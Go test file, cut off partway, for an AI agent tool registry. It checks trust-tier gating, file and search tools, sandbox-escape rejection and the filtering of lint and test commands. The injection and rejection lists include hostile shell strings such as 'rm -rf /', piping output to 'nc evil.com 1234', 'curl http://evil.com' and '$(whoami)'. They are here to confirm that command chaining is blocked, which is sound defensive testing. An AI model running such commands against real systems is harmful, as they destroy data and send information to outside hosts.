package executor

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/c360studio/semdragons/domain"
	"github.com/c360studio/semdragons/processor/agentprogression"
	"github.com/c360studio/semstreams/agentic"
	"github.com/c360studio/semstreams/graph"
	"github.com/c360studio/semstreams/message"
)

// TestBuiltinToolTierAlignment verifies that each tool registered by RegisterBuiltins
// enforces the trust tier documented in the trust tier table.
//
// Tier intent by tool category:
//
//	Apprentice (1-5) — read-only operations safe for any agent
//	Journeyman (6-10) — staging writes and external API access
//	Expert    (11-15) — production file writes, test execution
//	Master    (16-18) — unrestricted shell, party lead operations
func TestBuiltinToolTierAlignment(t *testing.T) {
	t.Parallel()

	cases := []struct {
		tool     string
		wantTier domain.TrustTier
		reason   string
	}{
		// Apprentice — read-only; safe for every agent regardless of level.
		{tool: "read_file", wantTier: domain.TierApprentice, reason: "read-only file access"},
		{tool: "list_directory", wantTier: domain.TierApprentice, reason: "read-only directory listing"},
		{tool: "search_text", wantTier: domain.TierApprentice, reason: "read-only text search"},
		{tool: "glob_files", wantTier: domain.TierApprentice, reason: "read-only file discovery"},
		{tool: "read_file_range", wantTier: domain.TierApprentice, reason: "read-only partial file access"},
		{tool: "submit_work_product", wantTier: domain.TierApprentice, reason: "all tiers can submit work"},
		{tool: "ask_clarification", wantTier: domain.TierApprentice, reason: "all tiers can ask questions"},

		// Journeyman — targeted writes and network access require demonstrated trust.
		{tool: "patch_file", wantTier: domain.TierJourneyman, reason: "targeted file edits require level 6+"},
		{tool: "http_request", wantTier: domain.TierJourneyman, reason: "network access requires level 6+"},
		{tool: "create_directory", wantTier: domain.TierJourneyman, reason: "filesystem writes require level 6+"},
		{tool: "rename_file", wantTier: domain.TierJourneyman, reason: "filesystem writes require level 6+"},
		{tool: "delete_file", wantTier: domain.TierJourneyman, reason: "destructive operations require level 6+"},

		// Expert — production-grade writes and test execution require level 11+.
		{tool: "write_file", wantTier: domain.TierExpert, reason: "full file write is a production capability"},
		{tool: "run_tests", wantTier: domain.TierExpert, reason: "test execution is a production capability"},
		{tool: "lint_check", wantTier: domain.TierExpert, reason: "lint execution is a production capability"},

		// Master — unrestricted shell and party-lead DAG operations require level 16+.
		{tool: "run_command", wantTier: domain.TierMaster, reason: "unrestricted shell requires high trust"},
		{tool: "decompose_quest", wantTier: domain.TierMaster, reason: "only party leads (Master+) can decompose quests"},
		{tool: "review_sub_quest", wantTier: domain.TierMaster, reason: "only party leads (Master+) can review sub-quests"},
	}

	reg := NewToolRegistry()
	reg.RegisterBuiltins()

	for _, tc := range cases {
		t.Run(tc.tool, func(t *testing.T) {
			t.Parallel()

			tool := reg.Get(tc.tool)
			if tool == nil {
				t.Fatalf("tool %q not found in registry after RegisterBuiltins", tc.tool)
			}

			if tool.MinTier != tc.wantTier {
				t.Errorf(
					"tool %q MinTier = %s (%d), want %s (%d): %s",
					tc.tool,
					tool.MinTier, tool.MinTier,
					tc.wantTier, tc.wantTier,
					tc.reason,
				)
			}
		})
	}
}

// TestBuiltinToolCount asserts that the total number of tools registered by
// RegisterBuiltins matches the expected count. A mismatch here means a tool
// was added (or removed) from RegisterBuiltins without updating
// TestBuiltinToolTierAlignment — update both together.
func TestBuiltinToolCount(t *testing.T) {
	t.Parallel()

	// RegisterBuiltins registers:
	//   read_file, write_file, list_directory, search_text, patch_file,
	//   http_request, run_tests, run_command           — 8 core tools
	//   decompose_quest                                 — 1 DAG lead tool
	//   review_sub_quest                               — 1 DAG review tool
	//   glob_files, read_file_range                    — 2 read-only Apprentice tools
	//   submit_work_product, ask_clarification         — 2 terminal tools (Apprentice)
	//   create_directory, rename_file, delete_file     — 3 new Journeyman tools
	//   lint_check                                     — 1 new Expert tool
	//
	// web_search is excluded — registered conditionally via RegisterWebSearch.
	// graph_query is excluded — requires a live EntityQueryFunc (RegisterGraphQuery).
	const wantCount = 18

	reg := NewToolRegistry()
	reg.RegisterBuiltins()

	got := len(reg.ListAll())
	if got != wantCount {
		t.Errorf(
			"RegisterBuiltins registered %d tools, want %d; "+
				"update TestBuiltinToolTierAlignment to cover any new tools",
			got, wantCount,
		)
	}
}

// TestGlobFilesMatching verifies that glob_files finds files matching ** patterns.
func TestGlobFilesMatching(t *testing.T) {
	t.Parallel()

	// Build a temp directory tree:
	//   root/
	//     main.go
	//     README.md
	//     sub/
	//       util.go
	//       style.css
	//     sub/deep/
	//       handler.go
	tmpDir := t.TempDir()
	mustWriteFile(t, filepath.Join(tmpDir, "main.go"), "package main")
	mustWriteFile(t, filepath.Join(tmpDir, "README.md"), "# readme")
	mustWriteFile(t, filepath.Join(tmpDir, "sub", "util.go"), "package sub")
	mustWriteFile(t, filepath.Join(tmpDir, "sub", "style.css"), "body {}")
	mustWriteFile(t, filepath.Join(tmpDir, "sub", "deep", "handler.go"), "package deep")

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	t.Run("recursive go files", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("glob_files", map[string]any{
			"pattern":      "**/*.go",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "main.go")
		assertContains(t, result.Content, "util.go")
		assertContains(t, result.Content, "handler.go")
		assertNotContains(t, result.Content, "README.md")
		assertNotContains(t, result.Content, "style.css")
	})

	t.Run("root-level only", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("glob_files", map[string]any{
			"pattern":      "*.go",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "main.go")
		assertNotContains(t, result.Content, "util.go")
	})

	t.Run("no matches returns helpful message", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("glob_files", map[string]any{
			"pattern":      "**/*.rs",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "No files matched")
	})
}

// TestSearchTextRegex verifies that search_text works in regex mode.
func TestSearchTextRegex(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	mustWriteFile(t, filepath.Join(tmpDir, "sample.txt"),
		"foo123\nbar456\nbaz789\nFOO999\n")

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	t.Run("regex matches digits", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("search_text", map[string]any{
			"pattern":      "foo[0-9]+",
			"path":         filepath.Join(tmpDir, "sample.txt"),
			"regex":        true,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "foo123")
		assertNotContains(t, result.Content, "bar456")
		// Case-sensitive by default — FOO999 should not match foo[0-9]+
		assertNotContains(t, result.Content, "FOO999")
	})

	t.Run("invalid regex returns error", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("search_text", map[string]any{
			"pattern":      "[invalid",
			"path":         filepath.Join(tmpDir, "sample.txt"),
			"regex":        true,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for invalid regex, got none")
		}
		assertContains(t, result.Error, "invalid regex")
	})
}

// TestSearchTextFileGlob verifies that the file_glob parameter filters files.
func TestSearchTextFileGlob(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	mustWriteFile(t, filepath.Join(tmpDir, "main.go"), "package main // hello")
	mustWriteFile(t, filepath.Join(tmpDir, "main.ts"), "// hello from ts")
	mustWriteFile(t, filepath.Join(tmpDir, "notes.md"), "hello notes")

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	call := makeToolCall("search_text", map[string]any{
		"pattern":      "hello",
		"path":         tmpDir,
		"file_glob":    "*.go",
		"_sandbox_dir": tmpDir,
	})
	result := reg.Execute(context.Background(), call, quest, agent)
	if result.Error != "" {
		t.Fatalf("unexpected error: %s", result.Error)
	}
	assertContains(t, result.Content, "main.go")
	assertNotContains(t, result.Content, "main.ts")
	assertNotContains(t, result.Content, "notes.md")
}

// TestSearchTextContextLines verifies that context_lines shows surrounding lines.
func TestSearchTextContextLines(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	content := strings.Join([]string{
		"line one",
		"line two",
		"TARGET line",
		"line four",
		"line five",
	}, "\n")
	mustWriteFile(t, filepath.Join(tmpDir, "data.txt"), content)

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	call := makeToolCall("search_text", map[string]any{
		"pattern":       "TARGET",
		"path":          filepath.Join(tmpDir, "data.txt"),
		"context_lines": float64(1),
		"_sandbox_dir":  tmpDir,
	})
	result := reg.Execute(context.Background(), call, quest, agent)
	if result.Error != "" {
		t.Fatalf("unexpected error: %s", result.Error)
	}
	assertContains(t, result.Content, "line two")   // one line before
	assertContains(t, result.Content, "TARGET line") // the match
	assertContains(t, result.Content, "line four")  // one line after
	assertNotContains(t, result.Content, "line one") // outside context
}

// TestReadFileRange verifies that read_file_range returns the requested lines.
func TestReadFileRange(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	var lines []string
	for i := 1; i <= 20; i++ {
		lines = append(lines, fmt.Sprintf("line %02d", i))
	}
	mustWriteFile(t, filepath.Join(tmpDir, "big.txt"), strings.Join(lines, "\n"))

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	t.Run("reads specified range", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("read_file_range", map[string]any{
			"path":         filepath.Join(tmpDir, "big.txt"),
			"start_line":   float64(5),
			"end_line":     float64(10),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		for i := 5; i <= 10; i++ {
			assertContains(t, result.Content, fmt.Sprintf("line %02d", i))
		}
		// Lines outside the range must not appear.
		assertNotContains(t, result.Content, "line 04")
		assertNotContains(t, result.Content, "line 11")
	})

	t.Run("defaults end_line to start + 100", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("read_file_range", map[string]any{
			"path":         filepath.Join(tmpDir, "big.txt"),
			"start_line":   float64(1),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "line 01")
		assertContains(t, result.Content, "line 20")
	})

	t.Run("returns message when start beyond EOF", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("read_file_range", map[string]any{
			"path":         filepath.Join(tmpDir, "big.txt"),
			"start_line":   float64(999),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "fewer than")
	})
}

// TestLintCheckAllowedPrefixes verifies that lint_check enforces the allowed-prefix list.
func TestLintCheckAllowedPrefixes(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierExpert,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeReview: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	allowed := []string{
		"go vet ./...",
		"golangci-lint run",
		"revive ./...",
		"eslint src/",
		"npx eslint .",
		"npm run lint",
		"make lint",
		"pylint mymodule",
		"flake8 .",
		"mypy src/",
		"ruff check .",
		"cargo clippy -- -D warnings",
		"dotnet format --verify-no-changes",
	}
	rejected := []string{
		"rm -rf /",
		"curl http://evil.com",
		"go build ./...",
		"npm install",
		"python manage.py migrate",
	}

	for _, cmd := range allowed {
		t.Run("allowed:"+cmd, func(t *testing.T) {
			t.Parallel()
			call := makeToolCall("lint_check", map[string]any{
				"command":      cmd,
				"_sandbox_dir": tmpDir,
			})
			result := reg.Execute(context.Background(), call, quest, agent)
			// The command may fail (tool not installed) but must NOT return a
			// "not allowed" error.
			if strings.Contains(result.Error, "lint_check only allows") {
				t.Errorf("command %q was incorrectly rejected: %s", cmd, result.Error)
			}
		})
	}

	for _, cmd := range rejected {
		t.Run("rejected:"+cmd, func(t *testing.T) {
			t.Parallel()
			call := makeToolCall("lint_check", map[string]any{
				"command":      cmd,
				"_sandbox_dir": tmpDir,
			})
			result := reg.Execute(context.Background(), call, quest, agent)
			if !strings.Contains(result.Error, "lint_check only allows") {
				t.Errorf("command %q should have been rejected, got error: %q, content: %q", cmd, result.Error, result.Content)
			}
		})
	}
}

// TestDeleteFileHandler verifies delete_file removes files and rejects directories.
func TestDeleteFileHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierJourneyman,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	t.Run("deletes existing file", func(t *testing.T) {
		t.Parallel()
		filePath := filepath.Join(tmpDir, "todelete.txt")
		mustWriteFile(t, filePath, "bye")

		call := makeToolCall("delete_file", map[string]any{
			"path":         filePath,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		if _, err := os.Stat(filePath); !os.IsNotExist(err) {
			t.Error("file still exists after delete")
		}
	})

	t.Run("rejects directory deletion", func(t *testing.T) {
		t.Parallel()
		dirPath := filepath.Join(tmpDir, "keepme")
		if err := os.MkdirAll(dirPath, 0755); err != nil {
			t.Fatalf("setup: %v", err)
		}

		call := makeToolCall("delete_file", map[string]any{
			"path":         dirPath,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error when deleting directory, got none")
		}
		assertContains(t, result.Error, "cannot delete directories")
	})
}

// TestRenameFileHandler verifies rename_file moves a file to a new path.
func TestRenameFileHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierJourneyman,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	oldPath := filepath.Join(tmpDir, "old.txt")
	newPath := filepath.Join(tmpDir, "new.txt")
	mustWriteFile(t, oldPath, "content")

	call := makeToolCall("rename_file", map[string]any{
		"old_path":     oldPath,
		"new_path":     newPath,
		"_sandbox_dir": tmpDir,
	})
	result := reg.Execute(context.Background(), call, quest, agent)
	if result.Error != "" {
		t.Fatalf("unexpected error: %s", result.Error)
	}

	if _, err := os.Stat(oldPath); !os.IsNotExist(err) {
		t.Error("old path still exists after rename")
	}
	if _, err := os.Stat(newPath); err != nil {
		t.Errorf("new path not found after rename: %v", err)
	}
}

// TestShellMetacharacterInjection verifies that run_tests and lint_check
// reject commands with shell metacharacters that could enable command chaining.
func TestShellMetacharacterInjection(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierExpert,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen:    {Level: domain.ProficiencyNovice},
			domain.SkillCodeReview: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	injections := []string{
		"go test ./... ; curl http://evil.com",
		"go test ./... && rm -rf /",
		"go test ./... || echo pwned",
		"go test ./... | nc evil.com 1234",
		"go test $(whoami)",
		"go test `id`",
		"go test ./... > /tmp/exfil",
		"go test ./... < /dev/null",
	}

	for _, cmd := range injections {
		t.Run("run_tests:"+cmd, func(t *testing.T) {
			t.Parallel()
			call := makeToolCall("run_tests", map[string]any{
				"command":      cmd,
				"_sandbox_dir": tmpDir,
			})
			result := reg.Execute(context.Background(), call, quest, agent)
			assertContains(t, result.Error, "shell metacharacters")
		})
	}

	lintInjections := []string{
		"go vet ./... ; whoami",
		"eslint . && curl evil.com",
		"make lint | tee /tmp/out",
	}

	for _, cmd := range lintInjections {
		t.Run("lint_check:"+cmd, func(t *testing.T) {
			t.Parallel()
			call := makeToolCall("lint_check", map[string]any{
				"command":      cmd,
				"_sandbox_dir": tmpDir,
			})
			result := reg.Execute(context.Background(), call, quest, agent)
			assertContains(t, result.Error, "shell metacharacters")
		})
	}
}

// TestRenameFileRejectsDirectories verifies rename_file refuses to operate on directories.
func TestRenameFileRejectsDirectories(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierJourneyman,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	dirPath := filepath.Join(tmpDir, "mydir")
	if err := os.MkdirAll(dirPath, 0755); err != nil {
		t.Fatalf("setup: %v", err)
	}

	call := makeToolCall("rename_file", map[string]any{
		"old_path":     dirPath,
		"new_path":     filepath.Join(tmpDir, "renamed"),
		"_sandbox_dir": tmpDir,
	})
	result := reg.Execute(context.Background(), call, quest, agent)
	if result.Error == "" {
		t.Fatal("expected error when renaming directory, got none")
	}
	assertContains(t, result.Error, "files only")
}

// TestCreateDirectoryHandler verifies that create_directory creates nested paths,
// rejects empty paths, and rejects sandbox-escape attempts.
func TestCreateDirectoryHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	// EvalSymlinks resolves macOS /var -> /private/var so validatePath sees the
	// same real path for both the sandbox and the new directory.
	realTmpDir, err := filepath.EvalSymlinks(tmpDir)
	if err != nil {
		t.Fatalf("EvalSymlinks: %v", err)
	}
	reg := NewToolRegistryWithSandbox(realTmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierJourneyman,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	t.Run("creates nested directory", func(t *testing.T) {
		t.Parallel()
		dirPath := filepath.Join(realTmpDir, "a", "b", "c")
		call := makeToolCall("create_directory", map[string]any{
			"path":         dirPath,
			"_sandbox_dir": realTmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		if info, err := os.Stat(dirPath); err != nil || !info.IsDir() {
			t.Errorf("expected directory %s to exist after create_directory", dirPath)
		}
	})

	t.Run("empty path returns error", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("create_directory", map[string]any{
			"path":         "",
			"_sandbox_dir": realTmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for empty path, got none")
		}
		assertContains(t, result.Error, "required")
	})

	t.Run("sandbox escape rejected", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("create_directory", map[string]any{
			"path":         filepath.Join(realTmpDir, "..", "escaped"),
			"_sandbox_dir": realTmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for sandbox-escaping path, got none")
		}
		assertContains(t, result.Error, "escapes sandbox")
	})
}

// mockSearchProvider is a test SearchProvider that returns canned results.
type mockSearchProvider struct {
	results []SearchResult
	err     error
}

func (m *mockSearchProvider) Name() string { return "mock" }

func (m *mockSearchProvider) Search(_ context.Context, _ string, _ int) ([]SearchResult, error) {
	return m.results, m.err
}

// TestWebSearchHandler verifies that web_search calls the provider and formats results.
// web_search is registered via RegisterWebSearch (not RegisterBuiltins).
func TestWebSearchHandler(t *testing.T) {
	t.Parallel()

	// web_search requires SkillResearch — use Apprentice tier which is sufficient.
	agent := &agentprogression.Agent{
		Tier: domain.TierApprentice,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillResearch: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	t.Run("valid query returns formatted results", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistry()
		reg.RegisterWebSearch(&mockSearchProvider{
			results: []SearchResult{
				{Title: "Go Concurrency Patterns", URL: "https://go.dev/blog/concurrency", Description: "Blog post about Go concurrency"},
			},
		})

		call := makeToolCall("web_search", map[string]any{"query": "Go concurrency patterns"})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "Go Concurrency Patterns")
		assertContains(t, result.Content, "https://go.dev/blog/concurrency")
	})

	t.Run("provider error is surfaced", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistry()
		reg.RegisterWebSearch(&mockSearchProvider{
			err: fmt.Errorf("API rate limited"),
		})

		call := makeToolCall("web_search", map[string]any{"query": "test"})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error, got none")
		}
		assertContains(t, result.Error, "API rate limited")
	})

	t.Run("empty query returns argument error", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistry()
		reg.RegisterWebSearch(&mockSearchProvider{})

		call := makeToolCall("web_search", map[string]any{"query": ""})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for empty query, got none")
		}
		assertContains(t, result.Error, "query argument is required")
	})

	t.Run("no results returns empty message", func(t *testing.T) {
		t.Parallel()
		reg := NewToolRegistry()
		reg.RegisterWebSearch(&mockSearchProvider{results: nil})

		call := makeToolCall("web_search", map[string]any{"query": "nonexistent topic"})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "No results found")
	})
}

// TestSubmitWorkProductHandler verifies the submit_work_product terminal tool:
// valid submissions produce JSON with type=work_product and StopLoop=true;
// missing or empty deliverable returns an error.
func TestSubmitWorkProductHandler(t *testing.T) {
	t.Parallel()

	reg := NewToolRegistry()
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	cases := []struct {
		name        string
		args        map[string]any
		wantErr     string // non-empty means we expect an error containing this substring
		wantType    string // expected "type" field in JSON
		wantSummary bool   // whether "summary" key must be present
		stopLoop    bool   // expected StopLoop value on success
	}{
		{
			name: "valid deliverable with summary",
			args: map[string]any{
				"deliverable": "Here is the code",
				"summary":     "Implemented feature",
			},
			wantType:    "work_product",
			wantSummary: true,
			stopLoop:    true,
		},
		{
			name: "valid deliverable without summary",
			args: map[string]any{
				"deliverable": "result content",
			},
			wantType:    "work_product",
			wantSummary: false,
			stopLoop:    true,
		},
		{
			name:    "empty deliverable",
			args:    map[string]any{"deliverable": ""},
			wantErr: "deliverable",
		},
		{
			name:    "missing deliverable",
			args:    map[string]any{},
			wantErr: "deliverable",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			call := makeToolCall("submit_work_product", tc.args)
			result := reg.Execute(context.Background(), call, quest, agent)

			if tc.wantErr != "" {
				if result.Error == "" {
					t.Fatalf("expected error containing %q, got none", tc.wantErr)
				}
				assertContains(t, result.Error, tc.wantErr)
				return
			}

			if result.Error != "" {
				t.Fatalf("unexpected error: %s", result.Error)
			}
			if !result.StopLoop {
				t.Error("expected StopLoop=true, got false")
			}

			var payload map[string]string
			if err := json.Unmarshal([]byte(result.Content), &payload); err != nil {
				t.Fatalf("Content is not valid JSON: %v — content: %s", err, result.Content)
			}
			if payload["type"] != tc.wantType {
				t.Errorf("type = %q, want %q", payload["type"], tc.wantType)
			}
			_, hasSummary := payload["summary"]
			if hasSummary != tc.wantSummary {
				t.Errorf("summary present = %v, want %v", hasSummary, tc.wantSummary)
			}
		})
	}
}

// TestAskClarificationHandler verifies the ask_clarification terminal tool:
// valid questions produce JSON with type=clarification and StopLoop=true;
// missing or empty question returns an error.
func TestAskClarificationHandler(t *testing.T) {
	t.Parallel()

	reg := NewToolRegistry()
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	cases := []struct {
		name     string
		args     map[string]any
		wantErr  string // non-empty means we expect an error containing this substring
		wantType string // expected "type" field in JSON
		stopLoop bool   // expected StopLoop value on success
	}{
		{
			name:     "valid question",
			args:     map[string]any{"question": "What format?"},
			wantType: "clarification",
			stopLoop: true,
		},
		{
			name:    "empty question",
			args:    map[string]any{"question": ""},
			wantErr: "question",
		},
		{
			name:    "missing question",
			args:    map[string]any{},
			wantErr: "question",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			call := makeToolCall("ask_clarification", tc.args)
			result := reg.Execute(context.Background(), call, quest, agent)

			if tc.wantErr != "" {
				if result.Error == "" {
					t.Fatalf("expected error containing %q, got none", tc.wantErr)
				}
				assertContains(t, result.Error, tc.wantErr)
				return
			}

			if result.Error != "" {
				t.Fatalf("unexpected error: %s", result.Error)
			}
			if !result.StopLoop {
				t.Error("expected StopLoop=true, got false")
			}

			var payload map[string]string
			if err := json.Unmarshal([]byte(result.Content), &payload); err != nil {
				t.Fatalf("Content is not valid JSON: %v — content: %s", err, result.Content)
			}
			if payload["type"] != tc.wantType {
				t.Errorf("type = %q, want %q", payload["type"], tc.wantType)
			}
		})
	}
}

// TestRegisterWebSearchConditional verifies that RegisterBuiltins does not include
// web_search, and that RegisterWebSearch adds it to the registry.
// This enforces the contract that web_search is opt-in (requires a provider).
func TestRegisterWebSearchConditional(t *testing.T) {
	t.Parallel()

	t.Run("RegisterBuiltins does not include web_search", func(t *testing.T) {
		t.Parallel()

		reg := NewToolRegistry()
		reg.RegisterBuiltins()

		if tool := reg.Get("web_search"); tool != nil {
			t.Error("web_search should not be registered by RegisterBuiltins, but it was found")
		}
	})

	t.Run("RegisterWebSearch adds web_search to registry", func(t *testing.T) {
		t.Parallel()

		reg := NewToolRegistry()
		reg.RegisterWebSearch(&mockSearchProvider{})

		tool := reg.Get("web_search")
		if tool == nil {
			t.Fatal("web_search should be registered after RegisterWebSearch, but it was not found")
		}
		if tool.Definition.Name != "web_search" {
			t.Errorf("tool name = %q, want %q", tool.Definition.Name, "web_search")
		}
	})
}

// TestReadFileHandler verifies content reading, missing-file errors, and truncation.
func TestReadFileHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	t.Run("reads existing file content", func(t *testing.T) {
		t.Parallel()
		filePath := filepath.Join(tmpDir, "hello.txt")
		mustWriteFile(t, filePath, "hello semdragons")
		call := makeToolCall("read_file", map[string]any{
			"path":         filePath,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "hello semdragons")
	})

	t.Run("non-existent file returns error", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("read_file", map[string]any{
			"path":         filepath.Join(tmpDir, "does_not_exist.txt"),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error reading non-existent file, got none")
		}
		assertContains(t, result.Error, "failed to read file")
	})

	t.Run("file larger than 100KB is truncated", func(t *testing.T) {
		t.Parallel()
		// Build a file that exceeds maxFileReadSize (100,000 bytes).
		largeContent := strings.Repeat("x", 101000)
		filePath := filepath.Join(tmpDir, "large.txt")
		mustWriteFile(t, filePath, largeContent)
		call := makeToolCall("read_file", map[string]any{
			"path":         filePath,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "(truncated)")
	})
}

// TestListDirectoryHandler verifies [dir] and [file] prefixes and error on missing dir.
func TestListDirectoryHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	// Populate a small tree: one file and one subdirectory.
	mustWriteFile(t, filepath.Join(tmpDir, "readme.txt"), "docs")
	if err := os.MkdirAll(filepath.Join(tmpDir, "subdir"), 0755); err != nil {
		t.Fatalf("setup: %v", err)
	}

	t.Run("lists files and directories with correct prefixes", func(t *testing.T) {
